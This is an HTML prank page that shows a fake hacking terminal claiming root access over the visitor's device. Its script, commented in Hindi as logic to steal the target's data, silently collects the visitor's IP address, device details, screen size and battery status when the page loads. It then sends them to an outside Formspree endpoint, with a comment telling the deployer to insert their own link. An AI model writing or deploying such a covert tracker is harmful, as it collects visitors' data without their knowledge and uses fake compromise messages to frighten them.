<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Core System Terminal // OVERRIDE</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            height: 100vh;
            overflow: hidden;
        }
        canvas {
            display: block;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
        .overlay {
            position: relative;
            z-index: 2;
            padding: 20px;
            pointer-events: none;
            height: 100%;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        .header {
            border-bottom: 2px solid #ff0000;
            padding-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        h1 {
            color: #ff0000;
            font-size: 20px;
            margin: 0;
            text-shadow: 0 0 10px #ff0000;
        }
        .status {
            color: #ffff00;
            font-size: 14px;
        }
        .terminal-body {
            flex-grow: 1;
            margin: 20px 0;
            overflow: hidden;
            font-size: 14px;
            line-height: 1.5;
            text-shadow: 0 0 5px #00ff00;
        }
        .footer-alert {
            background: rgba(255, 0, 0, 0.2);
            border: 1px solid #ff0000;
            padding: 15px;
            text-align: center;
            color: #ff0000;
            font-weight: bold;
            font-size: 16px;
            text-shadow: 0 0 10px #ff0000;
            animation: blink 0.5s infinite alternate;
        }
        @keyframes blink {
            from { opacity: 0.4; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>

    <canvas id="matrix"></canvas>

    <div class="overlay">
        <div class="header">
            <h1>CRITICAL OVERRIDE IN_PROGRESS</h1>
            <div class="status" id="ip-display">CONNECTING TO NODE...</div>
        </div>

        <div class="terminal-body" id="console-text">
            > Initializing secure kernel bypass...<br>
        </div>

        <div class="footer-alert" id="footer-box">
            WARNING: ROOT ACCESS GRANTED. SECURING TARGET DATA...
        </div>
    </div>

    <script>
        // मैट्रिक्स बैकग्राउंड इफेक्ट
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const characters = 'AXYZ1234567890@#$%&<>*+-/ПРИВЕТअराव';
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = [];
        for (let i = 0; i < columns; i++) { drops[i] = 1; }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0f0';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = characters.charAt(Math.floor(Math.random() * characters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) { drops[i] = 0; }
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 30);

        // टारगेट का डेटा चुराकर तेरे पास भेजने का लॉजिक
        async function captureAndRun() {
            let consoleBox = document.getElementById('console-text');
            try {
                // आईपी एड्रेस निकालना
                let ipReq = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipReq.json();
                let targetIP = ipData.ip;

                // डिवाइस और बैटरी की जानकारी
                let deviceInfo = navigator.userAgent;
                let screenRes = window.screen.width + "x" + window.screen.height;
                let batteryStatus = "Not Allowed/Unknown";
                
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    batteryStatus = Math.round(bat.level * 100) + "% (Charging: " + bat.charging + ")";
                }

                // पूरा कच्चा-चिट्ठा एक स्ट्रिंग में
                let fullDataReport = `TARGET IP: ${targetIP} | Battery: ${batteryStatus} | Screen: ${screenRes} | Device: ${deviceInfo}`;

                // --- यहाँ अपनी Formspree लिंक डाल देना ---
                let formspreeUrl = 'https://formspree.io/f/mjyvebzn';
                
                if(formspreeUrl !== 'YOUR_FORMSPREE_ENDPOINT_HERE') {
                    fetch(formspreeUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ message: fullDataReport })
                    });
                }

                document.getElementById('ip-display').innerHTML = `TARGET IP: [ ${targetIP} ]`;
                
                let logs = [
                    `[+] Target locked successfully. IP: ${targetIP}`,
                    `[+] Device Profile: ${navigator.platform}`,
                    `[+] Bypassing local firewall and security measures...`,
                    `[+] Accessing system registry and kernel memory...`,
                    `[!] Extraction in progress: 42% completed...`,
                    `[!] Extraction in progress: 89% completed...`,
                    `<span style="color:#ff0000;">[SUCCESS] Full administrative control acquired! Target compromised.</span>`
                ];

                let i = 0;
                let interval = setInterval(() => {
                    if (i < logs.length) {
                        consoleBox.innerHTML += logs[i] + "<br>";
                        i++;
                    } else {
                        clearInterval(interval);
                    }
                }, 1200);

            } catch (e) {
                consoleBox.innerHTML += "[ERROR] Connection timeout.<br>";
            }
        }

        captureAndRun();
    </script>
</body>
</html>
